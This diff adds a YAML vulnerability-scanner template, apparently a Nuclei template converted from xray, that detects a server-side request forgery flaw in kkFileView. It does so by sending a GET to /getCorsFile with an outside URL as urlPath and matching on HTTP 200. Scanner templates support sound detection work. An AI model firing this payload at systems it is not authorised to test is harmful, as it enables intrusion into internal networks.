@@ -1,0 +1,21 @@
+id: poc-yaml-kkfileview-getcorsfile-ssrf
+
+info:
+  name: poc-yaml-kkfileview-getcorsfile-ssrf
+  author: Aurora
+  severity: high
+  tags: xray-converted,ssrf,ct-484687
+  reference:
+    - https://github.com/kekingcn/kkFileView/issues/128
+
+http:
+  - raw:
+      - |
+        GET /getCorsFile?urlPath=http://example.com HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
